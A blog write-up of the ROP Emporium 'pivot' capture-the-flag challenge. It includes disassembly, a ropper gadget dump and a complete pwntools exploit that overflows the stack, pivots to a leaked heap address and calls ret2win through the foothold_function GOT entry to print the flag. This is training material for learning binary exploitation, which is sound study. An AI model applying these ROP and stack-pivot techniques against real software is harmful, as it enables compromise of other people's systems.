---
title: "ROP Emporium Pivot Writeup"
date: 2020-01-03T17:06:56+03:00
draft: false
description: ROP Emporium callenge - [Pivot](https://ropemporium.com/challenge/pivot.html)! This challenge, as most ROP Emporium challenges, requires us to overflow the stack to reach the `ret2win` function. In order to achieve this, we are going to need to create a stack pivot since there is not enough room in the stack itself.
tags:
    - binary-exploitation
    - pwning
    - rop
---

This challenge, as most ROP Emporium challenges, requires us to overflow the stack to reach the `ret2win` function. In order to achieve this, we are going to need to create a stack pivot since there is not enough room in the stack itself.

Using Ghidra, I spotted these functions - `pwnme`, `ret2win` and `uselessFunction`. Let's start by running the binary:

```bash
pivot by ROP Emporium
64bits

Call ret2win() from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0x7ffff7988f10
Send your second chain now and it will land there
> a
Now kindly send your stack smash
>

```

And then some gdb disassembling:

```bash
pwndbg> checksec
[*] '/home/adamgold/Desktop/ctfs/pivot/pivot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RPATH:    './'

pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000400996 <+0>:	push   rbp
   0x0000000000400997 <+1>:	mov    rbp,rsp
   0x000000000040099a <+4>:	sub    rsp,0x10
   0x000000000040099e <+8>:	mov    rax,QWORD PTR [rip+0x2016db]        # 0x602080 <stdout@@GLIBC_2.2.5>
   0x00000000004009a5 <+15>:	mov    ecx,0x0
   0x00000000004009aa <+20>:	mov    edx,0x2
   0x00000000004009af <+25>:	mov    esi,0x0
   0x00000000004009b4 <+30>:	mov    rdi,rax
   0x00000000004009b7 <+33>:	call   0x400870 <setvbuf@plt>
   0x00000000004009bc <+38>:	mov    rax,QWORD PTR [rip+0x2016dd]        # 0x6020a0 <stderr@@GLIBC_2.2.5>
   0x00000000004009c3 <+45>:	mov    ecx,0x0
   0x00000000004009c8 <+50>:	mov    edx,0x2
   0x00000000004009cd <+55>:	mov    esi,0x0
   0x00000000004009d2 <+60>:	mov    rdi,rax
   0x00000000004009d5 <+63>:	call   0x400870 <setvbuf@plt>
   0x00000000004009da <+68>:	mov    edi,0x400b98
   0x00000000004009df <+73>:	call   0x400800 <puts@plt>
   0x00000000004009e4 <+78>:	mov    edi,0x400bae
   0x00000000004009e9 <+83>:	call   0x400800 <puts@plt>
   0x00000000004009ee <+88>:	mov    edi,0x1000000
   0x00000000004009f3 <+93>:	call   0x400860 <malloc@plt>
   0x00000000004009f8 <+98>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004009fc <+102>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400a00 <+106>:	add    rax,0xffff00
   0x0000000000400a06 <+112>:	mov    QWORD PTR [rbp-0x10],rax
   0x0000000000400a0a <+116>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400a0e <+120>:	mov    rdi,rax
   0x0000000000400a11 <+123>:	call   0x400a3b <pwnme>
   0x0000000000400a16 <+128>:	mov    QWORD PTR [rbp-0x10],0x0
   0x0000000000400a1e <+136>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400a22 <+140>:	mov    rdi,rax
   0x0000000000400a25 <+143>:	call   0x4007f0 <free@plt>
   0x0000000000400a2a <+148>:	mov    edi,0x400bb6
   0x0000000000400a2f <+153>:	call   0x400800 <puts@plt>
   0x0000000000400a34 <+158>:	mov    eax,0x0
   0x0000000000400a39 <+163>:	leave
   0x0000000000400a3a <+164>:	ret
End of assembler dump.
pwndbg> disass pwnme
Dump of assembler code for function pwnme:
   0x0000000000400a3b <+0>:	push   rbp
   0x0000000000400a3c <+1>:	mov    rbp,rsp
   0x0000000000400a3f <+4>:	sub    rsp,0x30
   0x0000000000400a43 <+8>:	mov    QWORD PTR [rbp-0x28],rdi
   0x0000000000400a47 <+12>:	lea    rax,[rbp-0x20]
   0x0000000000400a4b <+16>:	mov    edx,0x20
   0x0000000000400a50 <+21>:	mov    esi,0x0
   0x0000000000400a55 <+26>:	mov    rdi,rax
   0x0000000000400a58 <+29>:	call   0x400820 <memset@plt>
   0x0000000000400a5d <+34>:	mov    edi,0x400bc0
   0x0000000000400a62 <+39>:	call   0x400800 <puts@plt>
   0x0000000000400a67 <+44>:	mov    rax,QWORD PTR [rbp-0x28]
   0x0000000000400a6b <+48>:	mov    rsi,rax
   0x0000000000400a6e <+51>:	mov    edi,0x400be0
   0x0000000000400a73 <+56>:	mov    eax,0x0
   0x0000000000400a78 <+61>:	call   0x400810 <printf@plt>
   0x0000000000400a7d <+66>:	mov    edi,0x400c20
   0x0000000000400a82 <+71>:	call   0x400800 <puts@plt>
   0x0000000000400a87 <+76>:	mov    edi,0x400c52
   0x0000000000400a8c <+81>:	mov    eax,0x0
   0x0000000000400a91 <+86>:	call   0x400810 <printf@plt>
   0x0000000000400a96 <+91>:	mov    rdx,QWORD PTR [rip+0x2015f3]        # 0x602090 <stdin@@GLIBC_2.2.5>
   0x0000000000400a9d <+98>:	mov    rax,QWORD PTR [rbp-0x28]
   0x0000000000400aa1 <+102>:	mov    esi,0x100
   0x0000000000400aa6 <+107>:	mov    rdi,rax
   0x0000000000400aa9 <+110>:	call   0x400840 <fgets@plt>
   0x0000000000400aae <+115>:	mov    edi,0x400c58
   0x0000000000400ab3 <+120>:	call   0x400800 <puts@plt>
   0x0000000000400ab8 <+125>:	mov    edi,0x400c52
   0x0000000000400abd <+130>:	mov    eax,0x0
   0x0000000000400ac2 <+135>:	call   0x400810 <printf@plt>
   0x0000000000400ac7 <+140>:	mov    rdx,QWORD PTR [rip+0x2015c2]        # 0x602090 <stdin@@GLIBC_2.2.5>
   0x0000000000400ace <+147>:	lea    rax,[rbp-0x20]
   0x0000000000400ad2 <+151>:	mov    esi,0x40
   0x0000000000400ad7 <+156>:	mov    rdi,rax
   0x0000000000400ada <+159>:	call   0x400840 <fgets@plt>
   0x0000000000400adf <+164>:	nop
   0x0000000000400ae0 <+165>:	leave
   0x0000000000400ae1 <+166>:	ret
End of assembler dump.
pwndbg> disass uselessFunction
Dump of assembler code for function uselessFunction:
   0x0000000000400ae2 <+0>:	push   rbp
   0x0000000000400ae3 <+1>:	mov    rbp,rsp
   0x0000000000400ae6 <+4>:	mov    eax,0x0
   0x0000000000400aeb <+9>:	call   0x400850 <foothold_function@plt>
   0x0000000000400af0 <+14>:	mov    edi,0x1
   0x0000000000400af5 <+19>:	call   0x400880 <exit@plt>
End of assembler dump.

```

NX enabled, meaning we can not execute nothing on the stack. We have two stages of shellcode (also can be seen when running the binary) - First one uses `fgets` and stores the input on previously allocated buffer, and the second one is vulnerable to buffer overflow.

From the `uselessFunction` disassembly, we can see that it just calls the `foothold_function` from `libpivot.so`. But `uselessFunction` isn’t called anywhere in the code, so in order to populate the `.got.plt` entry, we have to first call the `foothold_function`.

Let's design a basic plan:

-   Call the foothold_function to populate the .got.plt entry.
-   Add the offset between `ret2win` to `foothold_function` to get our `ret2win` function.
-   Call it.

Let's get the `ret2win` and `foothold_function` addresses:

```bash
adamgold@adamgold-VirtualBox:~/Desktop/CTFs/pivot$ objdump -d ./libpivot.so  | grep ret2win

0000000000000abe :

adamgold@adamgold-VirtualBox:~/Desktop/CTFs/pivot$ objdump -d ./libpivot.so  | grep foothold_function

0000000000000970 :
```

The offset:

```bash
pwndbg> p/x 0x0000000000000abe - 0x0000000000000970
$2 = 0x14e
```

And the .got.plt address of `foothold_function`:

```bash
Relocation section '.rela.plt' at offset 0x6c8 contains 10 entries:

  Offset          Info           Type           Sym. Value    Sym. Name + Addend

000000602018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 free@GLIBC_2.2.5 + 0

000000602020  000300000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0

000000602028  000400000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0

000000602030  000500000007 R_X86_64_JUMP_SLO 0000000000000000 memset@GLIBC_2.2.5 + 0

000000602038  000600000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0

000000602040  000700000007 R_X86_64_JUMP_SLO 0000000000000000 fgets@GLIBC_2.2.5 + 0

000000602048  000900000007 R_X86_64_JUMP_SLO 0000000000000000 foothold_function + 0

000000602050  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 malloc@GLIBC_2.2.5 + 0

000000602058  000b00000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0

000000602060  000d00000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
```

### Gadget Hunt

```bash
adamgold@adamgold-VirtualBox:~/Desktop/ctfs/pivot$ ropper --file pivot
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x0000000000400b7f: add bl, dh; ret;
0x0000000000400984: add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax;
0x0000000000400b7d: add byte ptr [rax], al; add bl, dh; ret;
0x0000000000400982: add byte ptr [rax], al; add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax;
0x0000000000400b7b: add byte ptr [rax], al; add byte ptr [rax], al; add bl, dh; ret;
0x00000000004008fc: add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret;
0x0000000000400a35: add byte ptr [rax], al; add byte ptr [rax], al; leave; ret;
0x0000000000400a36: add byte ptr [rax], al; add cl, cl; ret;
0x00000000004007cb: add byte ptr [rax], al; add rsp, 8; ret;
0x0000000000400af3: add byte ptr [rax], al; call 0x880; nop word ptr [rax + rax]; pop rax; ret;
0x0000000000400ad5: add byte ptr [rax], al; mov rdi, rax; call 0x840; nop; leave; ret;
0x0000000000400afe: add byte ptr [rax], al; pop rax; ret;
0x00000000004008fe: add byte ptr [rax], al; pop rbp; ret;
0x0000000000400b82: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret;
0x00000000004008e8: add byte ptr [rax], al; test rax, rax; je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400936: add byte ptr [rax], al; test rax, rax; je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400983: add byte ptr [rax], al; test rax, rax; je 0x97b; push rbp; mov rbp, rsp; call rax;
0x0000000000400a37: add byte ptr [rax], al; leave; ret;
0x0000000000400afd: add byte ptr [rax], r8b; pop rax; ret;
0x0000000000400a38: add cl, cl; ret;
0x0000000000400af1: add dword ptr [rax], eax; add byte ptr [rax], al; call 0x880; nop word ptr [rax + rax]; pop rax; ret;
0x0000000000400964: add eax, 0x20173e; add ebx, esi; ret;
0x0000000000400b0a: add eax, ebp; ret;
0x0000000000400969: add ebx, esi; ret;
0x00000000004007ce: add esp, 8; ret;
0x0000000000400b09: add rax, rbp; ret;
0x00000000004007cd: add rsp, 8; ret;
0x00000000004008f2: and byte ptr [rax], ah; jmp rax;
0x0000000000400967: and byte ptr [rax], al; add ebx, esi; ret;
0x0000000000400a25: call 0x7f0; mov edi, 0x400bb6; call 0x800; mov eax, 0; leave; ret;
0x0000000000400a2f: call 0x800; mov eax, 0; leave; ret;
0x0000000000400ada: call 0x840; nop; leave; ret;
0x0000000000400aeb: call 0x850; mov edi, 1; call 0x880; nop word ptr [rax + rax]; pop rax; ret;
0x0000000000400af5: call 0x880; nop word ptr [rax + rax]; pop rax; ret;
0x0000000000400995: call qword ptr [rbp + 0x48];
0x000000000040098e: call rax;
0x0000000000400ca3: call rsp;
0x0000000000400b5c: fmul qword ptr [rax - 0x7d]; ret;
0x00000000004008ed: je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
0x000000000040093b: je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400988: je 0x97b; push rbp; mov rbp, rsp; call rax;
0x0000000000400d9b: jmp qword ptr [rbp];
0x0000000000400d5b: jmp qword ptr [rdi];
0x0000000000400af9: jmp qword ptr [rsi + 0xf];
0x00000000004008f5: jmp rax;
0x0000000000400961: lcall [rbp - 0x3a]; add eax, 0x20173e; add ebx, esi; ret;
0x0000000000400a34: mov eax, 0; leave; ret;
0x0000000000400b06: mov eax, dword ptr [rax]; ret;
0x000000000040098c: mov ebp, esp; call rax;
0x0000000000400a2a: mov edi, 0x400bb6; call 0x800; mov eax, 0; leave; ret;
0x00000000004008f0: mov edi, 0x602078; jmp rax;
0x0000000000400af0: mov edi, 1; call 0x880; nop word ptr [rax + rax]; pop rax; ret;
0x0000000000400ad8: mov edi, eax; call 0x840; nop; leave; ret;
0x0000000000400ad2: mov esi, 0x40; mov rdi, rax; call 0x840; nop; leave; ret;
0x0000000000400b05: mov rax, qword ptr [rax]; ret;
0x000000000040098b: mov rbp, rsp; call rax;
0x0000000000400ad7: mov rdi, rax; call 0x840; nop; leave; ret;
0x0000000000400afb: nop dword ptr [rax + rax]; pop rax; ret;
0x00000000004008f8: nop dword ptr [rax + rax]; pop rbp; ret;
0x0000000000400945: nop dword ptr [rax]; pop rbp; ret;
0x0000000000400afa: nop word ptr [rax + rax]; pop rax; ret;
0x00000000004008f7: nop word ptr [rax + rax]; pop rbp; ret;
0x0000000000400a2c: or eax, dword ptr [rax]; call 0x800; mov eax, 0; leave; ret;
0x0000000000400b6c: pop r12; pop r13; pop r14; pop r15; ret;
0x0000000000400b6e: pop r13; pop r14; pop r15; ret;
0x0000000000400b70: pop r14; pop r15; ret;
0x0000000000400b72: pop r15; ret;
0x0000000000400b00: pop rax; ret;
0x00000000004008ef: pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400b6b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x0000000000400b6f: pop rbp; pop r14; pop r15; ret;
0x0000000000400900: pop rbp; ret;
0x0000000000400b73: pop rdi; ret;
0x0000000000400b71: pop rsi; pop r15; ret;
0x0000000000400b6d: pop rsp; pop r13; pop r14; pop r15; ret;
0x000000000040098a: push rbp; mov rbp, rsp; call rax;
0x0000000000400aca: ret 0x2015;
0x0000000000400987: sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax;
0x0000000000400b85: sub esp, 8; add rsp, 8; ret;
0x0000000000400b84: sub rsp, 8; add rsp, 8; ret;
0x00000000004008fa: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret;
0x00000000004008eb: test eax, eax; je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400939: test eax, eax; je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400986: test eax, eax; je 0x97b; push rbp; mov rbp, rsp; call rax;
0x00000000004008ea: test rax, rax; je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400938: test rax, rax; je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400985: test rax, rax; je 0x97b; push rbp; mov rbp, rsp; call rax;
0x0000000000400b03: xchg eax, esp; ret;
0x0000000000400b02: xchg rax, rsp; ret;
0x0000000000400989: int1; push rbp; mov rbp, rsp; call rax;
0x0000000000400a39: leave; ret;
0x0000000000400adf: nop; leave; ret;
0x00000000004007c9: ret;
```

We can use these gadgets:

1. pop `rax` to get `foothold_function` got address into it: `0x0000000000400b00: pop rax; ret;`
2. Move the actual value, which is `foothold_function` address into `rax`: `0x0000000000400b05: mov rax, qword ptr [rax]; ret;`
3. pop `rbp` to get our offset (`0x14e`) into it: `0x0000000000400900: pop rbp; ret;`
4. add `rbp` to `rax`: `0x0000000000400b09: add rax, rbp; ret;`
5. call the function: `0x000000000040098e: call rax;`

After that, for our buffer overflow, we can again use the `pop rax` gadget to get the heap address (which we get from the binary output) into it, and then swap `rsp` and `rax` (`0x0000000000400b02: xchg rax, rsp; ret;`) so we'll get our pivot - the `rsp` will point to the heap memory!

### Technical Chain

1. Call `foothold_function`

2. Load effective address of `foothold@got`

3. Add `0x14E` to that register

4. Return to the address in that register

5. Calculate `ret2win` address and return to it

Stack chain:

1. `xchg rax, rsp; ret;`

2. `pop rax; ret`

3. LEAKED HEAP ADDRESS

Heap ROP chain:

1. `0x0000000000400850` (foothold plt)

2. `pop rax; ret;`

3. `0x000000602048` (foothold got)

4. `pop rbp; ret;`

5. `0x14E`

6. `add rax, rbp; ret;`

7. Load effective address of `rax`

8. `call rax`

```python
from pwn import *

ret2win_offset = 0x0000000000000abe
foothold_offset = 0x0000000000000970
add_offset = ret2win_offset - foothold_offset
foothold_plt = 0x0000000000400850
foothold_got = 0x000000602048

xchg_rax = 0x000400b02
pop_rax = 0x0000000000400b00
add_rax_rbp = 0x0000000000400b09
pop_rbp = 0x0000000000400900
load_rax =0x0000000000400b05
call_rax = 0x000000000040098e

def exploit():
    p = process("./pivot")
    raw_input(str(p.proc.pid))


    p.recvuntil("pivot: 0x")
    addr = int(p.recv(12), 16)
    log.info("address received: 0x%x" % addr)

    p.recvrepeat(0.2)
    # stack pivot in heap
    stack_pivot = p64(foothold_plt)
    stack_pivot += p64(pop_rax)
    stack_pivot += p64(foothold_got)
    stack_pivot += p64(load_rax)
    stack_pivot += p64(pop_rbp)
    stack_pivot += p64(add_offset)
    stack_pivot += p64(add_rax_rbp)
    stack_pivot += p64(call_rax)

    log.info("sending heap data for the stack pivot")
    p.sendline(stack_pivot)
    p.recvrepeat(0.2)

    log.info("sending first bof - stack pivoting")
    # stack overflow, return to stack pivot
    stack_chain = p64(pop_rax)
    stack_chain += p64(addr)
    stack_chain += p64(xchg_rax)
    p.sendline("A" * 40 + stack_chain)
    p.recvuntil("foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so")
    log.success( p.recvall())


if __name__ == "__main__":
    exploit()

```

```bash
adamgold@adamgold-VirtualBox:~/Desktop/ctfs/pivot$ python exp.py
[+] Starting local process './pivot': pid 13106
13106
[*] address received: 0x7f2367d85f10
[*] sending heap data for the stack pivot
[*] sending first bof - stack pivoting
[+] Receiving all data: Done (33B)
[*] Process './pivot' stopped with exit code 0 (pid 13106)
[+] ROPE{********}
```
